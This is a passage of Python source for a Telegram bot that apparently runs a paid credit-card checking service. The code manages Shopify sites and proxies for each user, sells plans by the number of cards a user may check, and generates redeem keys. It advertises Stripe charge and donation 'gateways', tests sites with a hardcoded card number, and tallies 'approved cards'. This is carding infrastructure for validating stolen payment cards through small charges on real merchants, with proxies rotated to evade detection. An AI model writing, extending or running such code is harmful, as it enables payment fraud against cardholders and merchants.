    sites = extract_urls_from_text(text)
    if not sites:
        return await styled_reply(event, f"{PE} No valid URLs found", emoji_ids=[CE["cross"]])
    
    added = []
    for site in sites:
        if await add_site_db(event.sender_id, site):
            added.append(site)
    
    if added:
        await styled_reply(event, f"{PE} Added {len(added)}/{len(sites)} sites\n{PE} " + "\n".join(f"<code>{s}</code>" for s in added[:5]), emoji_ids=[CE["check"], CE["link"]])
    else:
        await styled_reply(event, f"{PE} No new sites added (may already exist)", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\b'))
async def rm_site_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    
    text = re.sub(r'^[/.]rm\s*', '', event.raw_text, flags=re.I).strip()
    if not text:
        return await styled_reply(event, f"{PE} Format: <code>/rm site.com</code>", emoji_ids=[CE["warn"]])
    
    sites = extract_urls_from_text(text)
    removed = 0
    for site in sites:
        if await remove_site_db(event.sender_id, site):
            removed += 1
    
    await styled_reply(event, f"{PE} Removed {removed}/{len(sites)} sites", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]sites$'))
async def list_sites_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    
    sites = await get_user_sites(event.sender_id)
    if not sites:
        return await styled_reply(event, f"{PE} No sites added yet.\n\nUse <code>/add</code> to add sites.", emoji_ids=[CE["warn"]])
    
    text = f"{PE} <b>Your Saved Sites</b> ({len(sites)})\n━━━━━━━━━━━━━━━━━\n"
    for idx, site in enumerate(sites[:50], 1):
        text += f"{PE} <code>{idx}.</code> {site}\n"
    if len(sites) > 50:
        text += f"\n<i>...and {len(sites) - 50} more</i>"
    
    await styled_reply(event, text, emoji_ids=[CE["globe"], CE["link"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]check$'))
async def check_sites_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    
    proxy = await get_working_proxy(event.sender_id)
    if not proxy:
        return await styled_reply(event, f"{PE} No working proxy found!", emoji_ids=[CE["warn"]])
    
    sites = await get_user_sites(event.sender_id)
    if not sites:
        return await styled_reply(event, f"{PE} No sites in DB", emoji_ids=[CE["warn"]])
    
    status_msg = await styled_reply(event, f"{PE} Checking {len(sites)} sites...", emoji_ids=[CE["globe"]])
    
    working = []
    dead = []
    for site in sites:
        res = await test_single_site(site, user_id=event.sender_id)
        if res['status'] == 'working':
            working.append(site)
        else:
            dead.append(site)
    
    for d in dead:
        await remove_site_db(event.sender_id, d)
    
    result = f"{PE} <b>Site Check Complete</b>\n━━━━━━━━━━━━━━━━━\n{PE} ✅ Working: {len(working)}\n{PE} ❌ Dead (removed): {len(dead)}"
    await styled_edit(status_msg, result, emoji_ids=[CE["check"], CE["tick"], CE["cross"]])

# ==================== Proxy Commands ====================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addpxy(\s|$)'))
async def addpxy_cmd(event):
    if event.is_group:
        return await styled_reply(event, f"{PE} Private chat only", emoji_ids=[CE["stop"]])
    
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    
    await ensure_user(event.sender_id)
    
    proxy_lines = []
    if event.is_reply:
        reply_msg = await event.get_reply_message()
        if reply_msg.document:
            file_path = await reply_msg.download_media()
            try:
                async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
                    content = await f.read()
                    proxy_lines = [line.strip() for line in content.splitlines() if line.strip()]
            except:
                pass
            finally:
                try:
                    os.remove(file_path)
                except:
                    pass
        elif reply_msg.text:
            proxy_lines = [line.strip() for line in reply_msg.text.splitlines() if line.strip()]
    
    if not proxy_lines:
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) == 2:
            proxy_lines = [line.strip() for line in parts[1].splitlines() if line.strip()]
    
    if not proxy_lines:
        return await styled_reply(event, f"{PE} <b>Usage:</b>\n<code>/addpxy ip:port:user:pass</code>\n\nOr reply to a .txt file with proxies", emoji_ids=[CE["warn"]])
    
    current_count = await get_proxy_count(event.sender_id)
    if current_count >= 100:
        return await styled_reply(event, f"{PE} Proxy limit reached (100/100)", emoji_ids=[CE["cross"]])
    
    parsed_proxies = []
    for line in proxy_lines:
        proxy_data = parse_proxy_format(line)
        if proxy_data:
            parsed_proxies.append(proxy_data)
    
    if not parsed_proxies:
        return await styled_reply(event, f"{PE} No valid proxies found", emoji_ids=[CE["cross"]])
    
    slots_available = 100 - current_count
    if len(parsed_proxies) > slots_available:
        parsed_proxies = parsed_proxies[:slots_available]
        await styled_reply(event, f"{PE} Only adding {slots_available} proxies (limit 100)", emoji_ids=[CE["warn"]])
    
    status_msg = await styled_reply(event, f"{PE} Testing {len(parsed_proxies)} proxies...", emoji_ids=[CE["shield"]])
    
    added = []
    failed = []
    for proxy_data in parsed_proxies:
        ok, _ = await test_proxy(proxy_data['proxy_url'])
        if ok:
            await add_proxy_db(event.sender_id, proxy_data)
            added.append(proxy_data)
        else:
            failed.append(proxy_data)
    
    result_text = f"{PE} <b>Proxy Import Results</b>\n━━━━━━━━━━━━━━━━━\n"
    if added:
        result_text += f"\n{PE} <b>Added ({len(added)}):</b>\n"
        for p in added[:10]:
            auth = f" ━ {p['username']}" if p.get('username') else ""
            result_text += f"{PE} <code>{p['type'].upper()} ━ {p['ip']}:{p['port']}{auth}</code>\n"
    if failed:
        result_text += f"\n{PE} <b>Failed ({len(failed)}):</b>\n"
        for f in failed[:5]:
            result_text += f"{PE} <code>{f['type'].upper()} ━ {f['ip']}:{f['port']}</code>\n"
    
    new_count = current_count + len(added)
    result_text += f"\n━━━━━━━━━━━━━━━━━\n{PE} Total Proxies: {new_count}/100"
    await styled_edit(status_msg, result_text, emoji_ids=[CE["shield"], CE["check"], CE["tick"], CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy$'))
async def list_proxy_cmd(event):
    if event.is_group:
        return await styled_reply(event, f"{PE} Private chat only", emoji_ids=[CE["stop"]])
    
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies:
        return await styled_reply(event, f"{PE} No proxies saved.\nUse <code>/addpxy</code> to add.", emoji_ids=[CE["cross"]])
    
    text = f"{PE} <b>Your Proxies</b> ({len(proxies)}/100)\n━━━━━━━━━━━━━━━━━\n"
    for idx, p in enumerate(proxies[:30], 1):
        auth = f" ━ {p['username']}" if p.get('username') else ""
        text += f"{PE} <code>{idx}.</code> {p['type'].upper()} ━ {p['ip']}:{p['port']}{auth}\n"
    if len(proxies) > 30:
        text += f"\n<i>...and {len(proxies) - 30} more</i>"
    
    await styled_reply(event, text, emoji_ids=[CE["shield"], CE["link"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]chkpxy$'))
async def chkpxy_cmd(event):
    if event.is_group:
        return await styled_reply(event, f"{PE} Private chat only", emoji_ids=[CE["stop"]])
    
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies:
        return await styled_reply(event, f"{PE} No proxies saved", emoji_ids=[CE["cross"]])
    
    status_msg = await styled_reply(event, f"{PE} Testing {len(proxies)} proxies...", emoji_ids=[CE["shield"]])
    
    working = []
    dead = []
    for idx, p in enumerate(proxies, 1):
        ok, _ = await test_proxy(p['proxy_url'])
        if ok:
            working.append(f"{PE} <code>{idx}.</code> {p['type'].upper()} ━ {p['ip']}:{p['port']}")
        else:
            dead.append(f"{PE} <code>{idx}.</code> {p['type'].upper()} ━ {p['ip']}:{p['port']}")
    
    text = f"{PE} <b>Proxy Check Complete</b>\n━━━━━━━━━━━━━━━━━\n"
    if working:
        text += f"\n<b>Working ({len(working)}):</b>\n" + "\n".join(working[:20]) + "\n"
    if dead:
        text += f"\n<b>Dead ({len(dead)}):</b>\n" + "\n".join(dead[:10]) + "\n"
    text += f"\n━━━━━━━━━━━━━━━━━\n{PE} {len(working)} working ━ {len(dead)} dead"
    
    await styled_edit(status_msg, text, emoji_ids=[CE["shield"], CE["check"], CE["tick"], CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmpxy(\s.+)?$'))
async def rmpxy_cmd(event):
    if event.is_group:
        return await styled_reply(event, f"{PE} Private chat only", emoji_ids=[CE["stop"]])
    
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies:
        return await styled_reply(event, f"{PE} No proxies saved", emoji_ids=[CE["cross"]])
    
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, f"{PE} Format: <code>/rmpxy index</code> or <code>/rmpxy all</code>", emoji_ids=[CE["warn"]])
    
    arg = parts[1].strip().lower()
    if arg == 'all':
        count = await clear_all_proxies(event.sender_id)
        await styled_reply(event, f"{PE} Removed all {count} proxies", emoji_ids=[CE["check"]])
    else:
        try:
            idx = int(arg) - 1
            removed = await remove_proxy_by_index(event.sender_id, idx)
            if removed:
                await styled_reply(event, f"{PE} Removed {removed['ip']}:{removed['port']}", emoji_ids=[CE["check"]])
            else:
                await styled_reply(event, f"{PE} Invalid index", emoji_ids=[CE["cross"]])
        except:
            await styled_reply(event, f"{PE} Invalid index", emoji_ids=[CE["cross"]])

# ==================== User Commands ====================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]info$'))
async def info_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    
    await ensure_user(event.sender_id)
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    sites = await get_user_sites(event.sender_id)
    proxies = await get_all_user_proxies(event.sender_id)
    
    text = f"""{PE} <b>YOUR PROFILE</b>
━━━━━━━━━━━━━━━━━
{PE} User ID ━ <code>{event.sender_id}</code>
{PE} Plan ━ <b>{plan.upper()}</b>
{PE} CC Limit ━ <code>{limit}</code>
{PE} Sites ━ <code>{len(sites)}</code>
{PE} Proxies ━ <code>{len(proxies)}/100</code>
━━━━━━━━━━━━━━━━━"""
    
    await styled_reply(event, text, emoji_ids=[CE["info"], CE["star"], CE["crown"], CE["chart"], CE["link"], CE["shield"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]redeem\b'))
async def redeem_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await styled_reply(event, f"{PE} <b>Usage:</b> <code>/redeem KEY</code>", emoji_ids=[CE["warn"]])
    
    key = parts[1].upper()
    success, msg = await use_key(event.sender_id, key)
    if success:
        await styled_reply(event, f"{PE} {msg}", emoji_ids=[CE["gift"]])
    else:
        await styled_reply(event, f"{PE} {msg}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan$'))
async def plan_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    
    plan = await get_user_plan(event.sender_id)
    text = f"""{PE} <b>AVAILABLE PLANS</b> {PE}
━━━━━━━━━━━━━━━━━
{PE} <b>FREE</b> ━ 300 CCs (Group only)
{PE} <b>PRO</b> ━ 2000 CCs + Proxy + Private
{PE} <b>TOJI</b> ━ 5000 CCs + Priority + Lifetime
━━━━━━━━━━━━━━━━━

Current Plan: <b>{plan.upper()}</b>

Contact admin to upgrade your plan."""
    
    kb = [[pbtn("💰 Upgrade Now", url="https://t.me/MRROOTTG")]]
    await styled_reply(event, text, buttons=kb, emoji_ids=[CE["crown"], CE["crown"], CE["star"], CE["gem"], CE["fire"]])

# ==================== Stop Callbacks ====================
@client.on(events.CallbackQuery(pattern=rb"stop_mtxt:(\d+)"))
async def stop_mtxt_cb(event):
    match = event.pattern_match
    uid = int(match.group(1).decode())
    if event.sender_id != uid and event.sender_id not in ADMIN_ID:
        return await event.answer("Not allowed", alert=True)
    ACTIVE_MTXT_PROCESSES.pop(uid, None)
    await event.answer("Stopped", alert=True)

@client.on(events.CallbackQuery(pattern=rb"stop_ran:(\d+)"))
async def stop_ran_cb(event):
    match = event.pattern_match
    uid = int(match.group(1).decode())
    if event.sender_id != uid and event.sender_id not in ADMIN_ID:
        return await event.answer("Not allowed", alert=True)
    ACTIVE_MTXT_PROCESSES.pop(uid, None)
    await event.answer("Stopped", alert=True)

@client.on(events.CallbackQuery(pattern=rb"stop_sd:(\d+)"))
async def stop_sd_cb(event):
    match = event.pattern_match
    uid = int(match.group(1).decode())
    if event.sender_id != uid and event.sender_id not in ADMIN_ID:
        return await event.answer("Not allowed", alert=True)
    ACTIVE_STRIPE5_PROCESSES.pop(uid, None)
    await event.answer("Stopped $5 check", alert=True)

@client.on(events.CallbackQuery(pattern=rb"stop_s1:(\d+)"))
async def stop_s1_cb(event):
    match = event.pattern_match
    uid = int(match.group(1).decode())
    if event.sender_id != uid and event.sender_id not in ADMIN_ID:
        return await event.answer("Not allowed", alert=True)
    ACTIVE_STRIPE1_PROCESSES.pop(uid, None)
    await event.answer("Stopped $1 donation check", alert=True)

@client.on(events.CallbackQuery(pattern=rb"stop_mst:(\d+)"))
async def stop_mst_cb(event):
    match = event.pattern_match
    uid = int(match.group(1).decode())
    if event.sender_id != uid and event.sender_id not in ADMIN_ID:
        return await event.answer("Not allowed", alert=True)
    ACTIVE_STRIPE_PROCESSES.pop(uid, None)
    await event.answer("Stopped Stripe check", alert=True)

# ==================== Test Single Site Helper ====================
async def test_single_site(site, test_card="4031630422575208|01|2030|280", user_id=None):
    proxy_data = await get_working_proxy(user_id) if user_id else None
    try:
        data, err = await call_shopify_api(site, test_card, proxy_data)
        if err or is_site_error(data.get('Response','')):
            return {"status": "dead", "response": err or data.get('Response',''), "site": site}
        return {"status": "working", "response": data.get('Response',''), "site": site}
    except:
        return {"status": "dead", "response": "Exception", "site": site}

# ==================== Admin Commands ====================
@client.on(events.NewMessage(pattern='/stats'))
async def stats_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    
    total_users = await get_total_users()
    total_premium = await get_premium_count()
    total_sites = await get_total_sites_count()
    total_cards = await get_total_cards_count()
    approved_cards = await get_approved_count()
    
    text = f"""{PE} <b>BOT STATISTICS</b>
━━━━━━━━━━━━━━━━━
{PE} Total Users ━ <code>{total_users}</code>
{PE} Premium Users ━ <code>{total_premium}</code>
{PE} Free Users ━ <code>{total_users - total_premium}</code>
━━━━━━━━━━━━━━━━━
{PE} Total Sites ━ <code>{total_sites}</code>
{PE} Total Cards ━ <code>{total_cards}</code>
{PE} Approved Cards ━ <code>{approved_cards}</code>"""
    
    await styled_reply(event, text, emoji_ids=[CE["chart"], CE["info"], CE["crown"], CE["star"], CE["link"], CE["bolt"]])

@client.on(events.NewMessage(pattern='/ban'))
async def ban_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await styled_reply(event, f"{PE} Usage: /ban user_id", emoji_ids=[CE["warn"]])
    
    uid = int(parts[1])
    await ban_user(uid)
    await styled_reply(event, f"{PE} Banned user {uid}", emoji_ids=[CE["stop"]])

@client.on(events.NewMessage(pattern='/unban'))
async def unban_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await styled_reply(event, f"{PE} Usage: /unban user_id", emoji_ids=[CE["warn"]])
    
    uid = int(parts[1])
    await unban_user(uid)
    await styled_reply(event, f"{PE} Unbanned user {uid}", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern='/setplan'))
async def setplan_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    
    parts = event.raw_text.split()
    if len(parts) != 3:
        return await styled_reply(event, f"{PE} Usage: /setplan user_id plan", emoji_ids=[CE["warn"]])
    
    uid = int(parts[1])
    plan = parts[2].lower()
    if plan not in ('free', 'pro', 'toji'):
        return await styled_reply(event, f"{PE} Invalid plan. Use: free, pro, toji", emoji_ids=[CE["cross"]])
    
    await set_user_plan(uid, plan, 30)
    await styled_reply(event, f"{PE} Set user {uid} to {plan.upper()} plan", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern='/genkey'))
async def genkey_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    
    parts = event.raw_text.split()
    if len(parts) != 4:
        return await styled_reply(event, f"{PE} Usage: /genkey pro 5 30", emoji_ids=[CE["warn"]])
    
    plan_type = parts[1].lower()
    try:
        amount = int(parts[2])
        days = int(parts[3])
    except ValueError:
        return await styled_reply(event, f"{PE} Amount and days must be numbers", emoji_ids=[CE["cross"]])
    
    if plan_type not in ('free', 'pro', 'toji'):
        return await styled_reply(event, f"{PE} Invalid plan", emoji_ids=[CE["cross"]])
    if amount <= 0 or amount > 20:
        return await styled_reply(event, f"{PE} Amount must be between 1 and 20", emoji_ids=[CE["warn"]])
    
    plan_emoji = {"free": "🆓", "pro": "💎", "toji": "👑"}
    keys = []
    for _ in range(amount):
        k = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        await create_key(k, days, plan_type)
        keys.append(k)
    
    text = f"""{PE} <b>Plan Keys Generated</b>
━━━━━━━━━━━━━━━━━
{PE} Plan ━ {plan_type.upper()}
{PE} Amount ━ {amount}
{PE} Duration ━ {days} days
━━━━━━━━━━━━━━━━━
"""
    for k in keys:
        text += f"{PE} <code>{k}</code> ━ {plan_emoji[plan_type]} {plan_type.upper()} ━ {days}d\n"
    text += f"\n━━━━━━━━━━━━━━━━━\n{PE} Redeem with <code>/redeem KEY</code>"
    
    await styled_reply(event, text, emoji_ids=[CE["gift"], CE["crown"], CE["star"]])

@client.on(events.NewMessage(pattern='/keys'))
async def keys_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"{PE} Admin only", emoji_ids=[CE["stop"]])
    
    all_keys = await get_all_keys()
    if not all_keys:
        return await styled_reply(event, f"{PE} No keys generated", emoji_ids=[CE["warn"]])
    
    text = f"{PE} <b>Recent Keys</b>\n━━━━━━━━━━━━━━━━━\n"
    for row in all_keys[:30]:
        key = row.get("key")
        plan = row.get("plan_type", "pro").upper()
        days = row.get("days", 0)
        used = "✅" if row.get("used") else "🆓"
        text += f"{PE} <code>{key}</code> ━ {plan} ━ {days}d ━ {used}\n"
    
    await styled_reply(event, text, emoji_ids=[CE["gift"]])

# ==================== Main Function ====================
async def shutdown(sig=None):
    print("Shutting down...")
    await _safe_close_session()
    try:
        await close_db()
    except:
        pass
    try:
        await client.disconnect()
    except:
        pass
    print("Bot disconnected.")

async def main():
    try:
        await init_db()
        print("🚀 Starting Bot with Beautiful UI and All Gateways!")
        print("   ✅ Shopify with 3 retries on different sites")
        print("   ✅ Stripe $5 Charge Gateway")
        print("   ✅ Stripe $1 Donation Gateway")
        print("   ✅ Stripe WooCommerce Gateway")
        print("   📱 Beautiful styled messages throughout")
        await client.start(bot_token=BOT_TOKEN)
        print("✅ Bot is running!")
        
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            loop.add_signal_handler(sig, lambda: asyncio.create_task(shutdown()))
        
        await client.run_until_disconnected()
    except Exception as e:
        print(f"FATAL ERROR: {e}")
        import traceback
        traceback.print_exc()
    finally:
        await shutdown()

if __name__ == "__main__":
    asyncio.run(main())
